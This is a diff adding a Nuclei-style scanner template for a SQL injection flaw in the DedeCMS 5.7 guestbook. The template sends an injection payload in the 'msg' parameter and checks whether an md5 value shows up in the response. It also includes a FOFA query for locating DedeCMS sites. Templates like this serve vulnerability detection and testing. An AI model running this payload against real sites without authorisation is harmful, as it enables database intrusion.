@@ -1,0 +1,47 @@
+id: poc-local-cms-xray-dedecms-guestbook-sqli
+
+info:
+  name: poc-local-cms-xray-dedecms-guestbook-sqli
+  author: capiton
+  severity: high
+  reference:
+    - https://blog.csdn.net/god_7z1/article/details/8180454
+  metadata:
+    verified: dedecms 5.7
+    fofa-query: app="DedeCMS"
+  tags: dedecms,cms,sqli
+
+variables:
+  r: "{{rand_int(800000000, 1000000000)}}"
+  md5_r: "{{md5(r)}}"
+
+requests:
+  - raw:
+      - |
+        GET /plus/guestbook.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email= HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /plus/guestbook.php HTTP/1.1
+        Host: {{Hostname}}
+    
+    extractors:
+      - type: regex 
+        part: body  # part of the response (header,body,all)
+        group: 1   
+        internal: true
+        name: articleid
+        regex:
+          - "action=admin&id=(.*?\\d{1,20})"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_r}}"
+
